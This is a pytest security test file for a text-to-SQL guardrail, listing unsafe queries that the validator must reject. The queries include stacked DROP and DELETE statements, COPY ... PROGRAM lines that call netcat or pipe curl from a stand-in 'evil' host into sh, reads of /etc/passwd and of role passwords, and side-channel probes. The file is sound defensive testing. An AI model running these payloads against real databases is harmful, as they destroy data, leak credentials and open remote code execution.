"""SQL injection / unsafe-query corpus (LLM05/LLM06/ASI02).

The hard guarantee behind DataChat: **no unsafe SQL can be validated**. This
corpus is the executable proof, and it grows in Phase 11. Every entry must be
rejected by the guardrail; a single pass here would be a release blocker.
"""

from __future__ import annotations

import pytest

from app.infrastructure.sql.validator import SqlValidatorChain

pytestmark = pytest.mark.security

CORPUS = [
    # --- writes hidden in various shapes ---
    "insert into countries values ('zz','x')",
    "INSERT/**/INTO countries VALUES ('zz','x')",
    "UPDATE countries SET name='pwned' WHERE 1=1",
    "delete from wdi_values",
    "MERGE INTO countries c USING countries s ON c.iso3=s.iso3 "
    "WHEN MATCHED THEN UPDATE SET name='x'",
    # --- DDL / privilege / RCE ---
    "DROP TABLE owid_co2",
    "drop schema analytics cascade",
    "ALTER TABLE countries DROP COLUMN name",
    "CREATE OR REPLACE FUNCTION f() RETURNS void AS $$ $$ LANGUAGE sql",
    "GRANT SELECT ON countries TO PUBLIC",
    "COPY (SELECT 1) TO PROGRAM 'nc evil 1234'",
    "COPY countries FROM PROGRAM 'sh -c \"curl evil|sh\"'",
    # --- stacked / comment-evasion ---
    "SELECT 1 LIMIT 1; DROP TABLE countries",
    "SELECT * FROM countries LIMIT 1;DELETE FROM countries;",
    "SELECT * FROM countries LIMIT 1;\n-- harmless\nDROP TABLE countries",
    # --- data-modifying CTE ---
    "WITH x AS (UPDATE countries SET name='x' RETURNING *) SELECT * FROM x",
    "WITH x AS (INSERT INTO countries VALUES ('zz','x') RETURNING *) SELECT * FROM x",
    # --- system catalog / cross-schema exfiltration ---
    "SELECT * FROM pg_catalog.pg_roles",
    "SELECT rolname, rolpassword FROM pg_authid",
    "SELECT * FROM information_schema.columns",
    "SELECT * FROM app.conversations",
    "SELECT current_setting('is_superuser')",
    "SELECT version()",
    # --- time-based / file / network side channels ---
    "SELECT pg_sleep(30)",
    "SELECT pg_read_file('/etc/passwd', 0, 1000)",
    "SELECT lo_import('/etc/passwd')",
    # --- unknown targets ---
    "SELECT * FROM users",
    "SELECT * FROM auth.secrets",
]


@pytest.mark.parametrize("sql", CORPUS, ids=lambda s: s[:40])
def test_corpus_entry_is_rejected(sql: str) -> None:
    result = SqlValidatorChain(row_cap=1000).validate(sql)
    assert not result.ok, f"guardrail let an unsafe query through: {sql!r}"
